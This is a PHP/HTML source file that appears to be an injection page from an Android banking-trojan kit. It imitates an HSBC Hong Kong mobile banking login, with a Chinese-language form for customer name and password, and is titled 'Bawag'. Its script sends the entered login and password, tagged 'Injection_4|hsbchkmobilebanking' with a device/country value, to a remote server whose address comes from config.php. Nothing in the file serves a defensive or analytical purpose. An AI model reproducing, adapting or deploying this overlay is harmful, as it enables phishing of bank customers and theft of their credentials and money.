<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="hk/hk.com.hsbc.hsbchkmobilebanking/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div id="content_div">
	<img style="width: 50px;" src="data:image/png;base64,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">
<center><br><br>
		<form id="form">
		
			<label> 客户名 </label>
			<input name="field2" id="login" maxlength="25" class="input" type="text">
	
			<label> 输入密码 </label>
			<input name="field3" id="password" maxlength="20" class="input" type="password">

			<input value="进入" onClick="sentServer();" class="submit" type="button">

		</form>
</center>
</div>
<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
	var login1 = document.forms["form"].elements["login"].value; 
	var pass = document.forms["form"].elements["password"].value; 

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|hsbchkmobilebanking|"+login1+"|"+pass);
	}
}
</script>
</body>
</html>
